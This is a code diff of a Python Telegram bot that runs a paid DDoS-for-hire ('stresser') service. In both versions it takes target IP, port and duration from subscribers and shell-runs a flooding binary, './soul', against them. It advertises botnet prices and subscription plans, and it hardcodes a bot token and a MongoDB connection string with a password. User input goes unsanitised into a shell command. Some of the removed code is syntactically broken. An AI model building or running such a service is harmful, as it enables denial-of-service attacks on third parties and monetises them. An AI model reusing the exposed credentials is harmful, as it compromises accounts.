@@ -1,376 +1,299 @@
-#attackddoserpython
 
-import telebot
-import subprocess
-import datetime
 import os
+import telebot
+import json
+import requests
+import logging
+import time
+from pymongo import MongoClient
+from datetime import datetime, timedelta
+import certifi
+import asyncio
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton
+from threading import Thread
 
-from keep_alive import keep_alive
-keep_alive()
-# Insert your Telegram bot token here
-bot = telebot.TeleBot('7316079762:AAGGIS7C1mn57G_SY4G6EvtbbHZaKfA1l5M')
+loop = asyncio.get_event_loop()
 
-# Admin user IDs
-admin_id = {"7439144436", "1896630842", ""}
+TOKEN = '7316079762:AAGGIS7C1mn57G_SY4G6EvtbbHZaKfA1l5M'
+MONGO_URI = 'mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv'
+FORWARD_CHANNEL_ID = -1002365113003
+CHANNEL_ID = -1002365113003
+error_channel_id = -1002365113003
 
-# File to store allowed user IDs
-USER_FILE = "users.txt"
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
-# File to store command logs
-LOG_FILE = "log.txt"
+client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
+db = client['rishi']
+users_collection = db.users
 
-def read_users():
+bot = telebot.TeleBot(TOKEN)
+REQUEST_INTERVAL = 1
+
+blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
+
+running_processes = []
+
+
+REMOTE_HOST = '4.213.71.147'  
+async def run_attack_command_on_codespace(target_ip, target_port, duration):
+    command = f"./soul {target_ip} {target_port} {duration} 900"
     try:
-        with open(USER_FILE, "r") as file:
-            return file.read().splitlines()
-    except FileNotFoundError:
-        return []
+       
+        process = await asyncio.create_subprocess_shell(
+            command,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        running_processes.append(process)
+        stdout, stderr = await process.communicate()
+        output = stdout.decode()
+        error = stderr.decode()
 
-# Function to read free user IDs and their credits from the file
-def read_free_users():
+        if output:
+            logging.info(f"Command output: {output}")
+        if error:
+            logging.error(f"Command error: {error}")
+
+    except Exception as e:
+        logging.error(f"Failed to execute command on Codespace: {e}")
+    finally:
+        if process in running_processes:
+            running_processes.remove(process)
+
+async def start_asyncio_loop():
+    while True:
+        await asyncio.sleep(REQUEST_INTERVAL)
+
+async def run_attack_command_async(target_ip, target_port, duration):
+    await run_attack_command_on_codespace(target_ip, target_port, duration)
+
+def is_user_admin(user_id, chat_id):
     try:
-        with open(FREE_USER_FILE, "r") as file:
-            lines = file.read().splitlines()
-            for line in lines:
-                if line.strip():  # Check if line is not empty
-                    user_info = line.split()
-                    if len(user_info) == 2:
-                        user_id, credits = user_info
-                        free_user_credits[user_id] = int(credits)
-                    else:
-                        print(f"Ignoring invalid line in free user file: {line}")
-    except FileNotFoundError:
-        pass
+        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
+    except:
+        return False
 
-allowed_user_ids = read_users()
+def check_user_approval(user_id):
+    user_data = users_collection.find_one({"user_id": user_id})
+    if user_data and user_data['plan'] > 0:
+        return True
+    return False
 
-# Function to log command to the file
-def log_command(user_id, target, port, time):
-    user_info = bot.get_chat(user_id)
-    if user_info.username:
-        username = "@" + user_info.username
-    else:
-        username = f"UserID: {user_id}"
-    
-    with open(LOG_FILE, "a") as file:  # Open in "append" mode
-        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
+def send_not_approved_message(chat_id):
+    bot.send_message(chat_id, "*YOU ARE NOT APPROVED BUY ACESS:-@KRISHNAVIPOWNER*", parse_mode='Markdown')
 
+@bot.message_handler(commands=['approve', 'disapprove'])
+def approve_or_disapprove_user(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    is_admin = is_user_admin(user_id, CHANNEL_ID)
+    cmd_parts = message.text.split()
 
-# Function to clear logs
-def clear_logs():
-    try:
-        with open(LOG_FILE, "r+") as file:
-            if file.read() == "":
-                response = "Logs are already cleared. No data found ."
-            else:
-                file.truncate(0)
-                response = "Logs cleared successfully ✅"
-    except FileNotFoundError:
-        response = "No logs found to clear."
-    return response
+    if not is_admin:
+        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
+        return
 
-# Function to record command logs
-def record_command_logs(user_id, command, target=None, port=None, time=None):
-    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
-    if target:
-        log_entry += f" | Target: {target}"
-    if port:
-        log_entry += f" | Port: {port}"
-    if time:
-        log_entry += f" | Time: {time}"
-    
-    with open(LOG_FILE, "a") as file:
-        file.write(log_entry + "\n")
+    if len(cmd_parts) < 2:
+        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
+        return
 
-@bot.message_handler(commands=['approve '])
-def approve _user(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        command = message.text.split()
-        if len(command) > 1:
-            user_to_approve  = command[1]
-            if user_to_approve  not in allowed_user_ids:
-                allowed_user_ids.append(user_to_approve )
-                with open(USER_FILE, "a") as file:
-                    file.write(f"{user_to_approve }\n")
-                response = f"User {user_to_approve } approve ed Successfully 👍."
-            else:
-                response = "User already exists 🤦‍♂️."
-        else:
-            response = "Please specify a user ID to approve  😒."
-    else:
-        response = "ONLY OWNER CAN USE."
+    action = cmd_parts[0]
+    target_user_id = int(cmd_parts[1])
+    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
+    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
 
-    bot.reply_to(message, response)
-
-
-
-@bot.message_handler(commands=['remove'])
-def remove_user(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        command = message.text.split()
-        if len(command) > 1:
-            user_to_remove = command[1]
-            if user_to_remove in allowed_user_ids:
-                allowed_user_ids.remove(user_to_remove)
-                with open(USER_FILE, "w") as file:
-                    for user_id in allowed_user_ids:
-                        file.write(f"{user_id}\n")
-                response = f"User {user_to_remove} removed successfully 👍."
-            else:
-                response = f"User {user_to_remove} not found in the list ."
-        else:
-            response = '''Please Specify A User ID to Remove. 
-✅ Usage: /remove <userid>'''
-    else:
-        response = "ONLY OWNER CAN USE."
-
-    bot.reply_to(message, response)
-
-
-@bot.message_handler(commands=['clearlogs'])
-def clear_logs_command(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        try:
-            with open(LOG_FILE, "r+") as file:
-                log_content = file.read()
-                if log_content.strip() == "":
-                    response = "Logs are already cleared. No data found ."
-                else:
-                    file.truncate(0)
-                    response = "Logs Cleared Successfully ✅"
-        except FileNotFoundError:
-            response = "Logs are already cleared ."
-    else:
-        response = "ONLY OWNER CAN USE."
-    bot.reply_to(message, response)
-
- 
-
-@bot.message_handler(commands=['allusers'])
-def show_all_users(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        try:
-            with open(USER_FILE, "r") as file:
-                user_ids = file.read().splitlines()
-                if user_ids:
-                    response = "Authorized Users:\n"
-                    for user_id in user_ids:
-                        try:
-                            user_info = bot.get_chat(int(user_id))
-                            username = user_info.username
-                            response += f"- @{username} (ID: {user_id})\n"
-                        except Exception as e:
-                            response += f"- User ID: {user_id}\n"
-                else:
-                    response = "No data found "
-        except FileNotFoundError:
-            response = "No data found "
-    else:
-        response = "ONLY OWNER CAN USE."
-    bot.reply_to(message, response)
-
-
-@bot.message_handler(commands=['logs'])
-def show_recent_logs(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
-            try:
-                with open(LOG_FILE, "rb") as file:
-                    bot.send_document(message.chat.id, file)
-            except FileNotFoundError:
-                response = "No data found ."
-                bot.reply_to(message, response)
-        else:
-            response = "No data found "
-            bot.reply_to(message, response)
-    else:
-        response = "ONLY OWNER CAN USE."
-        bot.reply_to(message, response)
-
-
-@bot.message_handler(commands=['id'])
-def show_user_id(message):
-    user_id = str(message.chat.id)
-    response = f"🤖Your ID: {user_id}"
-    bot.reply_to(message, response)
-
-# Function to handle the reply when free users run the /attack command
-def start_attack_reply(message, target, port, time):
-    user_info = message.from_user
-    username = user_info.username if user_info.username else user_info.first_name
-    
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: @KRISHNAVVIPMODSI"
-    bot.reply_to(message, response)
-
-# Dictionary to store the last time each user ran the /attack command
-attack_cooldown = {}
-
-COOLDOWN_TIME =0
-
-# Handler for /attack command
-@bot.message_handler(commands=['attack'])
-def handle_attack(message):
-    user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
-        # Check if the user is in admin_id (admins have no cooldown)
-        if user_id not in admin_id:
-            # Check if the user has run the command before and is still within the cooldown period
-            if user_id in attack_cooldown and (datetime.datetime.now() - attack_cooldown[user_id]).seconds < :
-                response = "You Are On Cooldown . Please Wait 5min Before Running The /attack Command Again."
-                bot.reply_to(message, response)
+    if action == '/approve':
+        if plan == 1:  # Instant Plan 🧡
+            if users_collection.count_documents({"plan": 1}) >= 99:
+                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                 return
-            # Update the last time the user ran the command
-            attack_cooldown[user_id] = datetime.datetime.now()
+        elif plan == 2:  # Instant++ Plan 💥
+            if users_collection.count_documents({"plan": 2}) >= 499:
+                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
+                return
+
+        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
+        users_collection.update_one(
+            {"user_id": target_user_id},
+            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
+            upsert=True
+        )
+        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
+    else:  # disapprove
+        users_collection.update_one(
+            {"user_id": target_user_id},
+            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
+            upsert=True
+        )
+        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"
+
+    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
+    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')
+# Add this global dictionary to track last attack times
+last_attack_time = {}
+
+# Attack command handler with wait time check
+@bot.message_handler(commands=['Attack'])
+def attack_command(message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+
+    # Check if the user is approved to use the /attack command
+    if not check_user_approval(user_id):
+        send_not_approved_message(chat_id)
+        return
+
+    # Get current time
+    current_time = time.time()
+
+    # Check if the user has attacked before and whether they need to wait
+    if user_id in last_attack_time:
+        last_attack = last_attack_time[user_id]
+        time_diff = current_time - last_attack
+
+        # Check if the user has to wait
+        if time_diff < 265.78:
+            wait_time = 265.78 - time_diff
+            bot.send_message(chat_id, f"⏳ Please wait {wait_time:.2f} seconds before initiating another attack.", parse_mode='Markdown')
+            return
+
+    # Send the prompt for attack details
+    bot.send_message(chat_id, "*Please provide the details for the attack in the following format:*\n* <host> <port> <time>*", parse_mode='Markdown')
+    bot.register_next_step_handler(message, process_attack_command)
+
+def process_attack_command(message):
+    try:
+        args = message.text.split()
+        if len(args) != 3:
+            bot.send_message(message.chat.id, "*WRONG COMMAND PLEASE /start*", parse_mode='Markdown')
+            return
+        target_ip, target_port, duration = args[0], int(args[1]), args[2]
+
+        # Proceed with attack command execution
+        if target_port in blocked_ports:
+            bot.send_message(message.chat.id, f"*Wrong IP port. Please provide the correct IP port.*", parse_mode='Markdown')
+            return
+
+        # Run attack asynchronously
+        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
+        bot.send_message(message.chat.id, f"*🚀 Attack Initiated! 💥\n\n🗺️ Target IP: {target_ip}\n🔌 Target Port: {target_port}\n⏳ Duration: {duration} seconds*", parse_mode='Markdown')
+
+        # Update the last attack time for the user
+        last_attack_time[user_id] = time.time()
+
+    except Exception as e:
+        logging.error(f"Error in processing attack command: {e}")
+
+def send_not_approved_message(chat_id):
+    bot.send_message(
+        chat_id, 
+        "*🚫 Unauthorized Access! 🚫*\n\n"
+        "*Oops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:*\n\n"
+        "👉 *Contact an Admin or the Owner for approval.*\n"
+        "🌟 *Become a proud supporter and purchase approval.*\n"
+        "💬 *Chat with an admin now and level up your capabilities!*\n\n"
+        "🚀 *Ready to supercharge your experience? Take action and get ready for powerful attacks!*", 
+        parse_mode='Markdown'
+    )
+
+
+
+def process_attack_command(message):
+    try:
+        args = message.text.split()
+        if len(args) != 3:
+            bot.send_message(message.chat.id, "*WRONG COMMAND PLEASE /start*", parse_mode='Markdown')
+            return
+        target_ip, target_port, duration = args[0], int(args[1]), args[2]
+
+        if target_port in blocked_ports:
+            bot.send_message(message.chat.id, "*Wrong IP port. Please provide the correct IP port.*", parse_mode='Markdown')
+            return
+
+        # Run attack asynchronously
+        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
+
+        # Send attack initiated message
+        bot.send_message(message.chat.id, f"*🚀 Attack Initiated! 💥\n\n🗺️ Target IP: {target_ip}\n🔌 Target Port: {target_port}\n⏳ Duration: {duration} seconds*", parse_mode='Markdown')
         
-        command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
-            target = command[1]
-            port = int(command[2])  # Convert time to integer
-            time = int(command[3])  # Convert port to integer
-            if time > 50000:
-                response = "Error: Time interval must be less than 80."
-            else:
-                record_command_logs(user_id, '/attack', target, port, time)
-                log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./soul {target} {port} {time} 900"
-                subprocess.run(full_command, shell=True)
-                response = f"attack Attack Finished. Target: {target} Port: {port} Port: {time}"
-        else:
-            response = "✅ Usage :- /attack <target> <port> <time>"  # Updated command syntax
-    else:
-        response = " You Are Not Authorized To Use This Command ."
+        # Send attack success message
+        bot.send_message(message.chat.id, "ATTACK SEND SUCCESSFULY! 💥🚀")  # New confirmation message
 
-    bot.reply_to(message, response)
+    except Exception as e:
+        logging.error(f"Error in processing attack command: {e}")
 
-
-
-# approve  /mylogs command to display logs recorded for attack and website commands
-@bot.message_handler(commands=['mylogs'])
-def show_command_logs(message):
-    user_id = str(message.chat.id)
-    if user_id in allowed_user_ids:
-        try:
-            with open(LOG_FILE, "r") as file:
-                command_logs = file.readlines()
-                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
-                if user_logs:
-                    response = "Your Command Logs:\n" + "".join(user_logs)
-                else:
-                    response = " No Command Logs Found For You ."
-        except FileNotFoundError:
-            response = "No command logs found."
-    else:
-        response = "You Are Not Authorized To Use This Command ."
-
-    bot.reply_to(message, response)
-
-
-@bot.message_handler(commands=['help'])
-def show_help(message):
-    help_text ='''🤖 Available commands:
-💥 /attack : Method For attack Servers. 
-💥 /rules : Please Check Before Use !!.
-💥 /mylogs : To Check Your Recents Attacks.
-💥 /plan : Checkout Our Botnet Rates.
-
-🤖 To See Admin Commands:
-💥 /admincmd : Shows All Admin Commands.
-
-'''
-    for handler in bot.message_handlers:
-        if hasattr(handler, 'commands'):
-            if message.text.startswith('/help'):
-                help_text += f"{handler.commands[0]}: {handler.doc}\n"
-            elif handler.doc and 'admin' in handler.doc.lower():
-                continue
-            else:
-                help_text += f"{handler.commands[0]}: {handler.doc}\n"
-    bot.reply_to(message, help_text)
+def start_asyncio_thread():
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(start_asyncio_loop())
 
 @bot.message_handler(commands=['start'])
-def welcome_start(message):
-    user_name = message.from_user.first_name
-    response = f'''👋🏻Welcome to free ddos bot, {user_name}! Feel Free to Explore.
-🤖Try To Run This Command : /help 
-'''
-    bot.reply_to(message, response)
+def send_welcome(message):
+    # Create a markup object
+    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
 
-@bot.message_handler(commands=['rules'])
-def welcome_rules(message):
-    user_name = message.from_user.first_name
-    response = f'''{user_name} Please Follow These Rules ⚠️:
+  
+    # Create buttons
+    btn1 = KeyboardButton("")
+    btn2 = KeyboardButton("🚀Attack")
+    btn3 = KeyboardButton("")
+    btn4 = KeyboardButton("ℹ️ My Info")
+    btn5 = KeyboardButton("")
+    btn6 = KeyboardButton("")
 
-1. Dont Run Too Many Attacks !! Cause A Ban From Bot
-2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
-3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
-    bot.reply_to(message, response)
+    # Add buttons to the markup
+    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
 
-@bot.message_handler(commands=['plan'])
-def welcome_plan(message):
-    user_name = message.from_user.first_name
-    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
+    bot.send_message(message.chat.id, "*🚀BOT READY TO ATTACK🚀*", reply_markup=markup, parse_mode='Markdown')
 
-Vip 🌟 :
--> Attack Time : 180 (S)
-> After Attack Limit : 5 Min
--> Concurrents Attack : 3
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    if message.text == "Instant Plan 🧡":
+        bot.reply_to(message, "*Instant Plan selected*", parse_mode='Markdown')
+    elif message.text == "🚀Attack":
+        bot.reply_to(message, "*🚀Attack Selected*", parse_mode='Markdown')
+        attack_command(message)
+    elif message.text == "💼ResellerShip":
+        bot.send_message(message.chat.id, "*FOR RESSELER SHIP DM :-@KRISHNAVIPOWNER*", parse_mode='Markdown')
+    elif message.text == "ℹ️ My Info":
+        user_id = message.from_user.id
+        user_data = users_collection.find_one({"user_id": user_id})
 
-Pr-ice List💸 :
-Day-->100 Rs
-Week-->400 Rs
-Month-->800 Rs
-'''
-    bot.reply_to(message, response)
+        # Fetch user data and display relevant information
+        if user_data:
+            username = message.from_user.username
+            plan = user_data.get('plan', 'Not Approved')  # Default to 'Not Approved' if no plan
+            valid_until = user_data.get('valid_until', 'Not Approved')
+            
+            # Define role based on approval status
+            role = 'User' if plan > 0 else 'Not Approved'
 
-@bot.message_handler(commands=['admincmd'])
-def welcome_plan(message):
-    user_name = message.from_user.first_name
-    response = f'''{user_name}, Admin Commands Are Here!!:
-
-💥 /approve  <userId> : approve  a User.
-💥 /remove <userid> Remove a User.
-💥 /allusers : Authorised Users Lists.
-💥 /logs : All Users Logs.
-💥 /broadcast : Broadcast a Message.
-💥 /clearlogs : Clear The Logs File.
-'''
-    bot.reply_to(message, response)
-
-
-@bot.message_handler(commands=['broadcast'])
-def broadcast_message(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        command = message.text.split(maxsplit=1)
-        if len(command) > 1:
-            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
-            with open(USER_FILE, "r") as file:
-                user_ids = file.read().splitlines()
-                for user_id in user_ids:
-                    try:
-                        bot.send_message(user_id, message_to_broadcast)
-                    except Exception as e:
-                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
-            response = "Broadcast Message Sent Successfully To All Users 👍."
+            # Format the information message
+            response = (
+                f"*👤User Info*\n"
+                f"🔖 Role: {role}\n"
+                f"🆔 User ID: {user_id}\n"
+                f"👤 Username: @{username}\n"
+                f"⏳ Approval Expiry: {valid_until if valid_until != 'Not Approved' else 'Not Approved'}"
+            )
         else:
-            response = "🤖 Please Provide A Message To Broadcast."
+            response = "*No account information found. Please contact the administrator.*"
+        
+        bot.reply_to(message, response, parse_mode='Markdown')
+    elif message.text == "🤖STRESSER SERVER":
+        bot.reply_to(message, "*🤖STRESSER SERVER RUNNING....*", parse_mode='Markdown')
+    elif message.text == "Contact admin✔️":
+        bot.reply_to(message, "*Contact admin selected*", parse_mode='Markdown')
     else:
-        response = "ONLY OWNER CAN USE."
+        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')
 
-    bot.reply_to(message, response)
-
-
-
-
-#bot.polling()
-while True:
-    try:
-        bot.polling(none_stop=True)
-    except Exception as e:
-        print(e)
+if __name__ == "__main__":
+    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
+    asyncio_thread.start()
+    logging.info("KRISHNA SERVER RUNNING.....")
+    while True:
+        try:
+            bot.polling(none_stop=True)
+        except Exception as e:
+            logging.error(f"An error occurred while polling: {e}")
+        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
+        time.sleep(REQUEST_INTERVAL)
